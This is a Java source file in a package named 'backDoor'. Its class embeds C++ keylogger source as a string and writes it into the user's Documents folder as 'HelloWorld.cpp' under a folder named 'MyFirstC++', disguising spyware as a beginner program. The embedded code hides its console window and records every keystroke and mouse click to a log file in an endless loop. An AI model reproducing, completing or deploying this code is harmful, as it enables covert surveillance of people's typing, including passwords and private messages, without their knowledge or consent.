package backDoor;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;


public class Creater 
{
   String user = System.getProperty("user.name");
   String path = "C:\\Users\\"+user+"\\Documents\\MyFirstC++";
   String code= "#include<iostream>\n" +
             "#include<string>\n" +
             "#include<fstream>\n" +
             "#include<Windows.h>\n" +
            "#include<stdio.h>\n" +
            "\n" +
            "using namespace std;\n" +
            "\n" +
            "void logIt(LPCSTR text)\n" +
            "{\n" +
            "ofstream f;\n" +
            "f.open(\"logs.txt\", fstream::app);\n" +
            "f << text;\n" +
            "f.close();\n" +
            "}\n" +
            "\n" +
            "\n" +
            "bool knownKey(int key)\n" +
            "{\n" +
            "switch (key)\n" +
            "{\n" +
            "case VK_SPACE: logIt(\" \"); break;\n" +
            "case VK_RETURN: logIt(\"\\n\"); break;\n" +
            "case VK_SHIFT: logIt(\" 'SHIFT+' \"); break;\n" +
            "case VK_BACK: logIt(\"\\b \"); break;\n" +
            "case VK_RBUTTON:logIt(\"*RightClick*..going to new line\"); logIt(\"\\n\"); break;\n" +
            "case VK_LBUTTON:logIt(\"*LeftClick*..going to new line\"); logIt(\"\\n\"); break;\n" +
            "default:return false;\n" +
            "\n" +
            "}\n" +
            "return true;\n" +
            "}\n" +
            "\n" +
            "\n" +
            "\n" +
            "int main()\n" +
            "{\n" +
            "char c;\n" +
            "HWND window;\n" +
            "AllocConsole();\n" +
            "window = FindWindowA(\"ConsoleWindowClass\", NULL);\n" +
            "ShowWindow(window, 0);\n" +
            "while (TRUE)\n" +
            "{\n" +
            "Sleep(10);\n" +
            "for (c = 8; c <= 180; c++)\n" +
            "{\n" +
            "if (GetAsyncKeyState(c) == -32767)\n" +
            "{\n" +
            "if (knownKey(c) == false)\n" +
            "{	\n" +
            "\n" +
            "ofstream f;\n" +
            "f.open(\"logs.txt\", fstream::app);\n" +
            "f << c;\n" +
            "f.close();\n" +
            "\n" +
            "}\n" +
            "}\n" +
            "}\n" +
            "}\n" +
            "return 0;\n" +
            "}";
   
    public void writecode()
      {
          File f = new File(path);
          f.mkdir();
        try {
                FileWriter write = new FileWriter(path+"\\HelloWorld.cpp");
                BufferedWriter bw = new BufferedWriter(write);
                bw.write(code);
                bw.close();
            } catch (IOException ex) {
            Logger.getLogger(Creater.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void batcher()
    {
    
    }

}
